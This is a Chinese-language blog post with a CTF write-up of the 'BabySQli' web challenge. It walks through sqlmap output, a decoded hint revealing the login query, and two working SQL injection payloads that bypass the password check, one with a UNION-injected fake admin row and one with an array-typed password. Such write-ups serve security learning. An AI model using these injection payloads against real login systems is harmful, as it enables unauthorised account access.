---
layout: post
title: "[GXYCTF2019]BabySQli"
date:   2024-9-29
tags: [SQL注入, CTF, WEB]
comments: true
author: MK-KM1542
---

***本题考点：联合查询所查询的数据不存在时，联合查询会构造一个虚拟的数据***

两个输入框，输入username和password

上sqlmap，得到

```sql
Database: web_sqli
Table: user
[1 entry]
+----+----------------------------------+----------+
| id | passwd                           | username |
+----+----------------------------------+----------+
| 1  | cdc9c819c7f8be2628d4180669009d28 | admin    |
+----+----------------------------------+----------+
```

储存了passwd的hash值，不能爆破

说明后台代码是将传入的密码进行了hash加密，然后与数据库中的hash值进行比对，如果相同，则登录成功。

先随便输入，查看回显页面源代码，发现有东西

```html
<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
```

base32+base64解码后得到

```sql
select * from user where username = '$name'
```

我们如果给name的值不是admin,然后提示错误，wrong user!

传admin,提示wrong pass!

***本题考点：联合查询所查询的数据不存在时，联合查询会构造一个虚拟的数据***

md5(1)=c4ca4238a0b923820dcc509a6f75849b

```text
name=1' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1
```

或者md5不能处理数组，如果是数组则会返回NULL

构造payload

```text
name=1' union select 1,'admin',NULL#&pw[]=1
```
